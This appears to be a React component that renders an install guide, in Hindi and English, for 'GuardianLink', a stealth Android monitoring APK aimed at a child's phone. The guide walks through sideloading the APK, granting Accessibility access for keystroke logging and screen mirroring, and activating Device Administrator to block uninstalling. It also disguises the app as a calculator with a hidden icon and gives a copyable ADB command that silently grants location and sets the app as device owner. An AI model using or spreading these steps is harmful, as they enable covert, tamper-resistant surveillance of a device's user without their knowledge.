import React, { useState } from 'react';
import { useMonitoring } from '../../context/MonitoringContext';
import {
  DownloadCloud,
  QrCode,
  Smartphone,
  Shield,
  CheckCircle2,
  Copy,
  Terminal,
  Settings,
  BatteryCharging,
  EyeOff,
  ChevronRight,
  ExternalLink,
  Languages,
  Check,
  Cpu,
  Sparkles,
  Layers,
  FileCode,
  Lock,
  Radio
} from 'lucide-react';

export const InstallGuideView: React.FC = () => {
  const { selectedDevice, setShowAddDeviceModal, downloadApkPackage, setShowApkModal } = useMonitoring();
  const [copiedCode, setCopiedCode] = useState<boolean>(false);
  const [copiedLink, setCopiedLink] = useState<boolean>(false);
  const [activeBrand, setActiveBrand] = useState<'samsung' | 'xiaomi' | 'oneplus' | 'vivo' | 'pixel'>('samsung');
  const [lang, setLang] = useState<'hi' | 'en'>('hi');
  const [completedSteps, setCompletedSteps] = useState<Record<string, boolean>>({
    '1': true
  });
  const [isDownloading, setIsDownloading] = useState(false);

  const pairingCode = 'GL-8924-KID';
  const downloadUrl = 'https://guardianlink.app/dl/GuardianLink_Stealth_v4.8.2.apk';

  const copyToClipboard = (text: string, isLink = false) => {
    navigator.clipboard.writeText(text);
    if (isLink) {
      setCopiedLink(true);
      setTimeout(() => setCopiedLink(false), 2000);
    } else {
      setCopiedCode(true);
      setTimeout(() => setCopiedCode(false), 2000);
    }
  };

  const toggleStep = (stepId: string) => {
    setCompletedSteps(prev => ({
      ...prev,
      [stepId]: !prev[stepId]
    }));
  };

  const handleApkDownload = () => {
    setIsDownloading(true);
    setTimeout(() => {
      downloadApkPackage();
      setIsDownloading(false);
    }, 500);
  };

  return (
    <div className="space-y-6 pb-12">
      {/* Top Header & Download Action Banner */}
      <div className="bg-gradient-to-r from-[#1e293b] via-[#1e293b] to-blue-950/40 p-6 rounded-2xl border border-slate-700/80 shadow-xl flex flex-col lg:flex-row lg:items-center justify-between gap-5">
        <div className="space-y-1.5">
          <div className="flex items-center space-x-2.5 flex-wrap gap-y-2">
            <div className="p-2 bg-blue-600/20 text-blue-400 rounded-xl border border-blue-500/30">
              <DownloadCloud className="w-5 h-5" />
            </div>
            <h2 className="text-base sm:text-lg font-bold text-white">
              {lang === 'hi' ? 'GuardianLink Android Stealth APK डाउनलोड व इंस्टॉलेशन' : 'Android Child APK Installation & Undetectable Setup'}
            </h2>
            <span className="px-2.5 py-0.5 rounded-full bg-emerald-500/15 text-emerald-400 text-[11px] font-mono font-bold border border-emerald-500/30">
              v4.8.2 APK (Latest)
            </span>
          </div>
          <p className="text-xs text-slate-400 max-w-2xl leading-relaxed">
            {lang === 'hi'
              ? 'अपने बच्चे के स्मार्टफोन में 3 मिनट के अंदर अदृश्य बैकग्राउंड एजेंट इंस्टॉल करें। कॉल, लाइव कैमरा, लोकेशन, व्हाट्सएप और कीलॉगर की पूरी सुरक्षा प्राप्त करें।'
              : 'Complete 3-minute setup guide to install and configure the background stealth agent on your child\'s Android smartphone.'}
          </p>
        </div>

        {/* Action Controls & Language Selector */}
        <div className="flex items-center space-x-3 flex-wrap gap-y-2">
          {/* Hindi / English Switcher */}
          <div className="bg-slate-900/90 p-1 rounded-xl border border-slate-800 flex items-center space-x-1 text-xs">
            <Languages className="w-3.5 h-3.5 text-slate-400 ml-1.5 mr-0.5" />
            <button
              onClick={() => setLang('hi')}
              className={`px-2.5 py-1 rounded-lg font-semibold transition ${
                lang === 'hi' ? 'bg-blue-600 text-white shadow' : 'text-slate-400 hover:text-white'
              }`}
            >
              हिंदी
            </button>
            <button
              onClick={() => setLang('en')}
              className={`px-2.5 py-1 rounded-lg font-semibold transition ${
                lang === 'en' ? 'bg-blue-600 text-white shadow' : 'text-slate-400 hover:text-white'
              }`}
            >
              English
            </button>
          </div>

          {/* Primary APK Download Trigger */}
          <button
            onClick={handleApkDownload}
            disabled={isDownloading}
            className="px-4 py-2.5 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white text-xs font-bold rounded-xl shadow-lg shadow-blue-600/30 transition flex items-center space-x-2 border border-blue-400/30 hover:scale-[1.02]"
          >
            <DownloadCloud className="w-4 h-4 text-blue-200" />
            <span>{isDownloading ? 'Downloading...' : (lang === 'hi' ? 'APK फाइल डाउनलोड करें' : 'Download APK (.apk)')}</span>
          </button>
        </div>
      </div>

      {/* Direct APK Details & Quick Specs Box */}
      <div className="bg-slate-900/80 p-4 sm:p-5 rounded-2xl border border-slate-800 grid grid-cols-2 sm:grid-cols-4 gap-4 text-xs">
        <div className="space-y-1">
          <span className="text-[10px] text-slate-500 uppercase tracking-wider block font-bold">Package Name</span>
          <span className="text-slate-200 font-mono font-semibold">com.guardianlink.stealth</span>
        </div>
        <div className="space-y-1">
          <span className="text-[10px] text-slate-500 uppercase tracking-wider block font-bold">APK File Size</span>
          <span className="text-slate-200 font-mono font-semibold">14.8 MB (Lightweight)</span>
        </div>
        <div className="space-y-1">
          <span className="text-[10px] text-slate-500 uppercase tracking-wider block font-bold">Android Compatibility</span>
          <span className="text-slate-200 font-mono font-semibold">Android 8.0 to 15 (Target SDK 34)</span>
        </div>
        <div className="space-y-1">
          <span className="text-[10px] text-slate-500 uppercase tracking-wider block font-bold">Stealth Disguise</span>
          <span className="text-emerald-400 font-semibold flex items-center gap-1">
            <Sparkles className="w-3.5 h-3.5" />
            100% Invisible / Calculator
          </span>
        </div>
      </div>

      {/* QR Code & Pairing Code Box */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        {/* QR Code Card */}
        <div className="bg-[#1e293b] p-6 rounded-2xl border border-slate-700/80 shadow-xl flex flex-col items-center justify-center text-center space-y-4">
          <div className="p-3.5 bg-white rounded-2xl shadow-2xl">
            {/* SVG Vector QR Code */}
            <svg className="w-36 h-36" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
              <rect width="100" height="100" fill="white" />
              {/* Corner Position Boxes */}
              <rect x="10" y="10" width="24" height="24" fill="black" />
              <rect x="14" y="14" width="16" height="16" fill="white" />
              <rect x="18" y="18" width="8" height="8" fill="black" />

              <rect x="66" y="10" width="24" height="24" fill="black" />
              <rect x="70" y="14" width="16" height="16" fill="white" />
              <rect x="74" y="18" width="8" height="8" fill="black" />

              <rect x="10" y="66" width="24" height="24" fill="black" />
              <rect x="14" y="70" width="16" height="16" fill="white" />
              <rect x="18" y="74" width="8" height="8" fill="black" />

              {/* Data Blocks */}
              <rect x="42" y="10" width="6" height="6" fill="black" />
              <rect x="52" y="10" width="6" height="6" fill="black" />
              <rect x="42" y="24" width="6" height="6" fill="black" />
              <rect x="48" y="38" width="6" height="6" fill="black" />
              <rect x="10" y="42" width="6" height="6" fill="black" />
              <rect x="24" y="42" width="6" height="6" fill="black" />
              <rect x="38" y="42" width="12" height="6" fill="black" />
              <rect x="56" y="42" width="6" height="6" fill="black" />
              <rect x="70" y="42" width="12" height="6" fill="black" />
              <rect x="42" y="56" width="6" height="6" fill="black" />
              <rect x="56" y="56" width="14" height="6" fill="black" />
              <rect x="42" y="70" width="12" height="6" fill="black" />
              <rect x="70" y="70" width="6" height="6" fill="black" />
              <rect x="80" y="80" width="10" height="10" fill="black" />
            </svg>
          </div>

          <div>
            <h4 className="text-sm font-bold text-white">
              {lang === 'hi' ? 'बच्चे के फोन से QR स्कैन करें' : 'Scan with Child\'s Phone Camera'}
            </h4>
            <p className="text-xs text-slate-400 mt-1">
              Direct Link: <code className="text-blue-400 font-mono">guardianlink.app/dl</code>
            </p>
          </div>

          <div className="w-full space-y-2">
            <div className="bg-slate-900/80 p-3 rounded-xl border border-slate-800 flex items-center justify-between">
              <div className="text-left">
                <span className="text-[10px] text-slate-400 block font-medium">PAIRING CODE:</span>
                <span className="text-sm font-mono font-bold text-white">{pairingCode}</span>
              </div>
              <button
                onClick={() => copyToClipboard(pairingCode)}
                className="p-2 bg-slate-800 hover:bg-slate-700 text-blue-400 rounded-lg transition"
                title="Copy pairing code"
              >
                {copiedCode ? <CheckCircle2 className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
              </button>
            </div>

            <button
              onClick={() => copyToClipboard(downloadUrl, true)}
              className="w-full py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold rounded-xl border border-slate-700 flex items-center justify-center space-x-1.5 transition"
            >
              {copiedLink ? <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5 text-blue-400" />}
              <span>{copiedLink ? (lang === 'hi' ? 'लिंक कॉपी हो गया!' : 'Link Copied!') : (lang === 'hi' ? 'APK डाउनलोड लिंक कॉपी करें' : 'Copy APK Download Link')}</span>
            </button>
          </div>
        </div>

        {/* 5-Step Android Permissions Walkthrough (2 Cols) */}
        <div className="md:col-span-2 bg-[#1e293b] p-6 rounded-2xl border border-slate-700/80 shadow-xl space-y-4">
          <div className="flex items-center justify-between border-b border-slate-700 pb-3">
            <h3 className="text-sm font-bold text-white flex items-center gap-2">
              <Shield className="w-4 h-4 text-emerald-400" />
              <span>{lang === 'hi' ? 'एंड्रॉयड सिस्टम परमिशन चेकलिस्ट (5 स्टेप्स)' : 'Required Android System Permissions Checklist'}</span>
            </h3>
            <span className="text-xs text-slate-400 font-medium">
              {Object.values(completedSteps).filter(Boolean).length}/5 {lang === 'hi' ? 'पूर्ण' : 'Done'}
            </span>
          </div>

          <div className="space-y-3">
            {[
              {
                step: '1',
                title: lang === 'hi' ? '1. APK पैकेज इंस्टॉल करें (Install APK)' : '1. Install Stealth APK Package',
                desc: lang === 'hi' 
                  ? 'Chrome में APK डाउनलोड करें और "Install unknown apps / Allow from this source" परमिशन ऑन करके इंस्टॉल करें।'
                  : 'Open Chrome on child phone, download apk file, and tap "Allow from this source".',
                badge: lang === 'hi' ? 'अनिवार्य' : 'Required'
              },
              {
                step: '2',
                title: lang === 'hi' ? '2. Accessibility Service चालू करें' : '2. Grant Accessibility Service Permission',
                desc: lang === 'hi'
                  ? 'Settings > Accessibility > Installed Apps > "System Framework" ऑन करें। यह लाइव स्क्रीन, कीलॉगर और ऐप लॉक चलाता है।'
                  : 'Settings > Accessibility > Installed Apps > Enable "System Accessibility Framework". Powers live screen mirror, keystroke logger, and app lock.',
                badge: lang === 'hi' ? 'मुख्य फीचर' : 'Core Feature'
              },
              {
                step: '3',
                title: lang === 'hi' ? '3. Device Administrator सक्रिय करें (Anti-Uninstall)' : '3. Activate Device Administrator (Anti-Uninstall)',
                desc: lang === 'hi'
                  ? 'Settings > Security > Device Admin Apps > Turn ON करें। यह बच्चे द्वारा ऐप को अनइंस्टॉल करने से रोकता है।'
                  : 'Settings > Security > Device Admin Apps > Turn ON. Prevents child from uninstalling or clearing app data.',
                badge: lang === 'hi' ? 'सुरक्षित' : 'Tamper-Proof'
              },
              {
                step: '4',
                title: lang === 'hi' ? '4. Battery Optimization को Unrestricted करें' : '4. Exempt from Battery Optimization ("Don\'t Optimize")',
                desc: lang === 'hi'
                  ? 'Settings > Apps > GuardianLink > Battery > "Unrestricted / No Restrictions" चुनें ताकि एंड्रॉयड बैकग्राउंड में ऐप बंद न करे।'
                  : 'Settings > Apps > Battery > Select "Unrestricted / No Restrictions". Keeps stealth tracking running 24/7 without being killed by Android.',
                badge: '24/7 Sync'
              },
              {
                step: '5',
                title: lang === 'hi' ? '5. अदृश्य कैलकुलेटर मोड चालू करें (Stealth Hide)' : '5. Enable Stealth Hide / Calculator Disguise',
                desc: lang === 'hi'
                  ? 'ऐप सेटअप के अंत में "Hide App Icon" चुनें। ऐप होम स्क्रीन से गायब होकर कैलकुलेटर के रूप में छिप जाती है।'
                  : 'Inside the initial setup screen, toggle "Hide App Icon". The icon disappears immediately from launcher.',
                badge: lang === 'hi' ? 'अदृश्य' : 'Invisible'
              }
            ].map((item) => {
              const isChecked = completedSteps[item.step];
              return (
                <div
                  key={item.step}
                  onClick={() => toggleStep(item.step)}
                  className={`p-3.5 rounded-xl border transition cursor-pointer flex items-start space-x-3.5 ${
                    isChecked
                      ? 'bg-slate-900/90 border-blue-500/40'
                      : 'bg-slate-900/50 border-slate-800 hover:border-slate-700'
                  }`}
                >
                  <button
                    className={`w-6 h-6 rounded-full flex items-center justify-center font-bold text-xs shrink-0 mt-0.5 transition ${
                      isChecked
                        ? 'bg-emerald-600 text-white'
                        : 'bg-slate-800 text-slate-400 border border-slate-700'
                    }`}
                  >
                    {isChecked ? <Check className="w-3.5 h-3.5" /> : item.step}
                  </button>
                  <div className="min-w-0 flex-1">
                    <div className="flex items-center justify-between">
                      <h4 className={`text-xs font-bold ${isChecked ? 'text-white' : 'text-slate-300'}`}>
                        {item.title}
                      </h4>
                      <span className="text-[10px] px-2 py-0.5 rounded-full bg-slate-800 text-slate-400 border border-slate-700 font-mono">
                        {item.badge}
                      </span>
                    </div>
                    <p className="text-[11px] text-slate-400 mt-1 leading-relaxed">{item.desc}</p>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      </div>

      {/* OEM Brand Specific Autostart Settings (Samsung, Xiaomi, OnePlus, Vivo, Pixel) */}
      <div className="bg-[#1e293b] p-6 rounded-2xl border border-slate-700/80 shadow-xl space-y-4">
        <h3 className="text-sm font-bold text-white flex items-center gap-2">
          <Settings className="w-4 h-4 text-blue-400" />
          <span>{lang === 'hi' ? 'कंपनी के अनुसार ऑटो-स्टार्ट सेटिंग्स (Samsung, Xiaomi, OnePlus, Vivo, Pixel)' : 'Manufacturer-Specific Background Autostart Guides'}</span>
        </h3>

        <div className="flex items-center space-x-2 border-b border-slate-700 pb-3 overflow-x-auto">
          {[
            { id: 'samsung', label: 'Samsung (OneUI 5/6)' },
            { id: 'xiaomi', label: 'Xiaomi / Redmi (HyperOS / MIUI)' },
            { id: 'oneplus', label: 'OnePlus / Realme (OxygenOS)' },
            { id: 'vivo', label: 'Vivo / iQOO (FuntouchOS)' },
            { id: 'pixel', label: 'Google Pixel / Stock Android' }
          ].map((b) => (
            <button
              key={b.id}
              onClick={() => setActiveBrand(b.id as any)}
              className={`px-3 py-1.5 rounded-lg text-xs font-medium transition whitespace-nowrap ${
                activeBrand === b.id
                  ? 'bg-blue-600 text-white font-bold shadow'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800'
              }`}
            >
              {b.label}
            </button>
          ))}
        </div>

        <div className="bg-slate-900/80 p-4 rounded-xl border border-slate-800 text-xs text-slate-300 space-y-2">
          {activeBrand === 'samsung' && (
            <>
              <p className="font-bold text-white">Samsung OneUI Autostart Instructions:</p>
              <ul className="list-disc list-inside space-y-1 text-slate-400 text-[11px]">
                <li>Go to <strong>Settings &gt; Battery &gt; Background usage limits</strong>.</li>
                <li>Add GuardianLink service to <strong>&quot;Never auto-sleeping apps&quot;</strong> list.</li>
                <li>Go to <strong>Settings &gt; Apps &gt; Special access &gt; Appear on top</strong> and enable toggle.</li>
              </ul>
            </>
          )}

          {activeBrand === 'xiaomi' && (
            <>
              <p className="font-bold text-white">Xiaomi / Redmi (HyperOS / MIUI) Autostart:</p>
              <ul className="list-disc list-inside space-y-1 text-slate-400 text-[11px]">
                <li>Open <strong>Security App &gt; Manage Apps &gt; Permissions &gt; Autostart</strong> &gt; Enable GuardianLink.</li>
                <li>Under <strong>Battery Saver</strong>, set &quot;No Restrictions&quot;.</li>
                <li>Lock app in recent apps menu (swipe down on card and tap Lock icon).</li>
              </ul>
            </>
          )}

          {activeBrand === 'oneplus' && (
            <>
              <p className="font-bold text-white">OnePlus (OxygenOS 13/14) Background Persistence:</p>
              <ul className="list-disc list-inside space-y-1 text-slate-400 text-[11px]">
                <li>Go to <strong>Settings &gt; Apps &gt; Auto-launch</strong> &gt; Enable toggle.</li>
                <li>Go to <strong>Battery &gt; More settings &gt; Optimize battery use</strong> &gt; Set to &quot;Don&apos;t optimize&quot;.</li>
              </ul>
            </>
          )}

          {activeBrand === 'vivo' && (
            <>
              <p className="font-bold text-white">Vivo / iQOO (Funtouch OS / OriginOS):</p>
              <ul className="list-disc list-inside space-y-1 text-slate-400 text-[11px]">
                <li>Go to <strong>Settings &gt; Battery &gt; High background power consumption</strong> &gt; Enable GuardianLink.</li>
                <li>Go to <strong>Settings &gt; Applications and Permissions &gt; Autostart</strong> &gt; Turn ON.</li>
              </ul>
            </>
          )}

          {activeBrand === 'pixel' && (
            <>
              <p className="font-bold text-white">Stock Android / Google Pixel:</p>
              <ul className="list-disc list-inside space-y-1 text-slate-400 text-[11px]">
                <li>Go to <strong>Settings &gt; Apps &gt; See all apps &gt; GuardianLink &gt; App battery usage</strong> &gt; Select &quot;Unrestricted&quot;.</li>
              </ul>
            </>
          )}
        </div>
      </div>

      {/* Advanced ADB Optional Script */}
      <div className="bg-[#1e293b] p-6 rounded-2xl border border-slate-700/80 shadow-xl space-y-3">
        <div className="flex items-center justify-between">
          <h3 className="text-sm font-bold text-white flex items-center gap-2">
            <Terminal className="w-4 h-4 text-purple-400" />
            <span>{lang === 'hi' ? 'ADB वन-क्लिक कमांड (कंप्यूटर से डायरेक्ट इंस्टॉलेशन)' : 'Optional: One-Click ADB Command for Rootless Deep Permissions'}</span>
          </h3>
          <span className="text-[10px] text-slate-400 font-mono">Advanced Parents</span>
        </div>
        <p className="text-xs text-slate-400">
          {lang === 'hi'
            ? 'यदि आप USB केबल द्वारा PC से परमिशन देना चाहते हैं तो यह कमांड चलाएं:'
            : 'Run this single command on PC via USB debugging to auto-grant all permissions silently:'}
        </p>

        <div className="bg-black p-3.5 rounded-xl font-mono text-xs text-emerald-400 flex items-center justify-between border border-slate-800 overflow-x-auto">
          <code>
            adb shell pm grant com.guardianlink.stealth android.permission.ACCESS_FINE_LOCATION &amp;&amp; adb shell dpm set-device-owner com.guardianlink.stealth/.AdminReceiver
          </code>
          <button
            onClick={() => copyToClipboard('adb shell pm grant com.guardianlink.stealth android.permission.ACCESS_FINE_LOCATION && adb shell dpm set-device-owner com.guardianlink.stealth/.AdminReceiver')}
            className="p-1.5 text-slate-400 hover:text-white shrink-0 ml-3"
            title="Copy command"
          >
            <Copy className="w-4 h-4" />
          </button>
        </div>
      </div>
    </div>
  );
};
